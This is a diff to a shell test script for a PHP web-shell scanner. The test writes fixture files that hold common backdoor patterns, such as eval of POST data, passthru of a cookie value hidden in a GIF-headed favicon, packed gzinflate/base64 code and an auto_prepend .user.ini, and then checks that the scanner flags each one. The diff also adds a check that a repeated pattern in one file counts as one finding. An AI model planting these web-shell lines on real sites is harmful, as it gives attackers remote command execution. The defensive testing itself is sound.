@@ -4958,6 +4958,7 @@ require_once \$_SERVER['DOCUMENT_ROOT'] . '/config.php'; include 'header.php';
 if (isset(\$_POST['name'])) { \$name = trim(\$_POST['name']); \$obj->save(\$_POST['name']); }
 echo '<img src="data:image/png;base64,${_sc_b64}">';
 echo "\xEF\xBB\xBF" . chr(13) . chr(10);
+\$map = array("\x80" => "\xE2\x82\xAC", "\x81" => "\xEF\xBF\xBD", "\x82" => "\xE2\x80\x9A", "\x83" => "\xC6\x92", "\x84" => "\xE2\x80\x9E", "\x85" => "\xE2\x80\xA6", "\x09\x0A\x0B\x0C\x0D\x20\x2F\x3E");
 EOF
 printf '<?php eval(base64_decode("ZWNobyAxOw=="));\n' >"$_scp/a-decoded.php"
 printf '<?php\n\n@eval ( $_POST["c"] );\n' >"$_scp/b-request.php"
@@ -4969,7 +4970,7 @@ printf '<?php /* WSO Shell */ $default_action = "FilesMan";\n' >"$_scp/g-known.p
 printf 'GIF89a<?php passthru($_COOKIE["x"]);\n' >"$_scp/favicon.ico"
 printf '<?php $c = gzinflate(base64_decode($s)); $f($_POST["a"]);\n' >"$_scp/h-packed.php"
 printf '<?php $p = "%s";\n' "$_sc_b64" >"$_scp/i-long.php"
-printf '<?php $k = "%s";\n' "$(printf '\\x6a%.0s' $(seq 1 25))" >"$_scp/j-hex.php"
+printf '<?php $k = "%s";\n$j = "%s";\n' "$(printf '\\x6a%.0s' $(seq 1 25))" "$(printf '\\x6b%.0s' $(seq 1 30))" >"$_scp/j-hex.php"
 printf '<?php $n = %s"";\n' "$(printf 'chr(1%.0s).' $(seq 1 9))" >"$_scp/k-chr.php"
 printf '<?php // Silence is golden.\n' >"$_scp/wp-content/uploads/2026/index.php"
 printf 'auto_prepend_file = /home/sc1.example.com/public_html/a-decoded.php\n' >"$_scp/.user.ini"
@@ -4991,7 +4992,7 @@ for _c in "a-decoded.php|eval of decoded data" "b-request.php|eval of what the r
 done
 assert_has "the line is named" $'F\tH\t3\teval of what the request sent\t@eval ( $_POST["c"] );' "$(_sc_file public_html/b-request.php)"
 for _c in "h-packed.php|decoding inside decoding (packed code)" "h-packed.php|a function held in a variable, called with request data" \
-          "i-long.php|a long encoded string (1600 characters)" "j-hex.php|text hidden as \\x escapes (25 on one line)" \
+          "i-long.php|a long encoded string (1600 characters)" "j-hex.php|text hidden as \\x escapes (25 letters on one line)" \
           "k-chr.php|text put together from chr() pieces" "wp-content/uploads/2026/index.php|a script in an upload directory" \
           ".user.ini|a file run before or after every script" ".htaccess|file types handed to PHP" \
           "l-write.php|what the request sent, written to a file" "l-write.php|preg_replace with the e modifier"; do
@@ -4999,6 +5000,7 @@ for _c in "h-packed.php|decoding inside decoding (packed code)" "h-packed.php|a 
   assert_has "worth a look: ${_c%%|*}" $'P\tL\tpublic_html/'"${_c%%|*}" "$_r"
   assert_has "  as ${_c##*|}" "${_c##*|}" "$_r"
 done
+assert_eq  "a second line of the same kind is not a second finding" 1 "$(_sc_file public_html/j-hex.php | grep -c 'text hidden as' || true)"
 assert_has "every file read is counted, the empty one too" $'N\t19\t0' "$_rec"
 assert_eq  "a finding is reported once per file" 1 "$(printf '<?php\neval(base64_decode("a"));\neval(base64_decode("b"));\n' >"$_scp/a-decoded.php"; _scan_run "$_sc" 0 | grep -c $'^F\tH\t[0-9]*\teval of decoded data\teval(base64_decode("[ab]' || true)"
 # what the site's files say reaches a terminal as printable characters only
